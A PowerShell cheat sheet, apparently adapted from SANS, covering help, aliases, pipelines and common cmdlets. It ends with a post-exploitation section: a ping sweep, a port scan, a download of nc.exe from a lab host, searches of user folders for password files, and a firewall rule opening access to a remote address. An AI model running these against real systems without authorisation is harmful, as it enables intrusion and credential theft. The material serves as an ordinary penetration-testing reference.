# Powershell Cheat Sheet

## Purpose

:   The Purpose of this cheat sheet is to describe some common options and techniques for use in Microsoft's PowerShell.

## Syntax

- New- Creates a new resource
- Set- Modifies an existing resource
- Get- Retrieves an existing resource
- Read- Gets information from a source, such as a file
- Find- Used to look for an object
- Search- Used to create a reference to a resource
- Start- (asynchronous) begin an operation, such as starting a process
- Invoke- (synchronous) perform an operation such as running a command

## Getting Help

To get help with help:

```powershell
PS C:\> Get-Help
```

To read cmdlet self documentation:

```powershell
PS C:\> Get-Help <cmdlet>
```

Detailed help:

```powershell
PS C:\> Get-Help <cmdlet> -detailed
```

Usage example:

```powershell
PS C:\> Get-Help <cmdlet> -examples
```

Full(everything) help:

```powershell
PS C:\> Get-Help <cmdlet> -full
```

Online help (if available):

```powershell
PS C:\> Get-Help <cmdlet> -online
```

## Finding CMDlets

To get a list of all available cmdlets:

```powershell
PS C:\> Get-Command
```

Get-Command supports filtering. To filter cmdlets on the verb set:

```powershell
PS C:\> Get-Command Set*
```

```powershell
PS C:\> Get-Command –Verb Set
```

Or on the noun process:

```powershell
PS C:\> Get-Command *Process
```

```powershell
PS C:\> Get-Command –Noun process
```

## CMDlet Aliases

: Aliases provide short reference to long commands

To list available aliases(alias alias):

```powershell
PS C:\> Get-Alias
```

To expand an alias into a full name:

```powershell
PS C:\> alias <unknown alias>
```

```powershell
PS C:\> alias gcm
```

## Efficient PowerShell

Tab completion:

```powershell
PS C:\> get-child<TAB>
```

```powershell
PS C:\> Get-ChildItem
```

Parameter shortening:

```powershell
PS C:\> ls –recurse
```

Is equivalent to:

```powershell
PS C:\> ls -r
```

## 5 Powershell Essentials

Shows help & examples:

```powershell
PS C:\> ls -r
```

```powershell
PS C:\> help [cmdlet] -examples
```

Shows a list of Commands:

```powershell
PS C:\> ls -r
```

```powershell
PS C:\> help [cmdlet] -examples
```

Shows properties & methods:

```powershell
PS C:\> [cmdlet] | Get-Member
```

```powershell
PS C:\> [cmdlet] | gm
```

Takes each item on pipeline and handles it as $_

```powershell
PS C:\> ForEach-Object { $_ }
```

```powershell
PS C:\> [cmdlet] | % { [cmdlet] $_ }
```

Searches for strings in files or output, like grep:

```powershell
PS C:\> Select-String
```

```powershell
PS C:\> sls –path [file] –pattern [string]
```

## Pipelining, Loops, And Variables

Piping cmdlet output to another cmdlet:

```powershell
PS C:\> Get-Process | Format-List –property name
```

ForEach-Object in the pipeline(alias %):

```powershell
PS C:\> ls *.txt | ForEach-Object {cat $_}
```

Where-Object condition (alias where or ?):

```powershell
PS C:\> Get-Process | Where-Object {$_.name –eq "notepad"}
```

Generating ranges of numbers and looping:

```powershell
PS C:\> 1..10
```

```powershell
PS C:\> 1..10 | % {echo "Hello!"}
```

Creating and listing variables:

```powershell
PS C:\> $tmol = 42
```

```powershell
PS C:\> ls variable:
```

Examples of passing cmdlet output down pipeline:

```powershell
PS C:\> dir | group extension | sort
```

```powershell
PS C:\> Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled
```

## Useful CMDlets(and aliases)

Get a directory listing(ls, dir, gci):

```powershell
PS C:\> Get-ChildItem
```

Copy a File(cp, copy, cpi):

```powershell
PS C:\> Copy-Item src.txt dst.txt
```

Move a file(mv, move, mi):

```powershell
PS C:\> Move-Item src.txt dst.txt
```

Find text within a file:

```powershell
PS C:\> Select-String -path c:\users\*.txt -pattern password
```

```powershell
PS C:\> ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}
```

Display file contents(cat, type, gc):

```powershell
PS C:\> Get-Content File.txt
```

Get present dictionary(pwd, gc):

```powershell
PS C:\> Get-Location
```

Get a process listing(ps, gps):

```powershell
PS C:\> Get-Process 
```

Get a service listing:

```powershell
PS C:\> Get-Service
```

Formatting output of a command(Format-List):

```powershell
PS C:\> ls | Format-List -property name
```

Paginating output:

```powershell
PS C:\> ls -r | Out-Host -paging
```

Get the SHA1 hash of a file:

```powershell
PS C:\> Get-FileHash -Algorithm SHA1 file.txt
```

Exporting output to CSV:

```powershell
PS C:\> Get-Process | Export-CSV procs.csv 
```

## Powershell for Pentester Post-Exploitation

Conduct a ping sweep:

```powershell
PS C:\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}
```

Conduct a port scan:

```powershell
PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
```

Fetch a file via HTTP(wget in PowerShell):

```powershell
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe", "nc.exe")
```

Find all files with a particular name:

```powershell
PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
```

Get a listing of all installed Microsoft hotfixes:

```powershell
PS C:\> Get-HotFix
```

Naviagate the Windows registry

```powershell
PS C:\> cd HKLM:\
PS HKLM:\> ls
```

List programs set to start automatically in the registry:

```powershell
PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run
```

Convert string from ASCII to Base64:

```powershell
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))
```

List and modify the windows Firewall rules:

```powershell
PS C:\> Get-NetFirewallRule –all
PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25
```

<div class="grid cards" markdown>

- [:octicons-arrow-right-24: Go to the SANS PDF](https://wiki.sans.blue/Tools/pdfs/PowerShell.pdf)

</div>
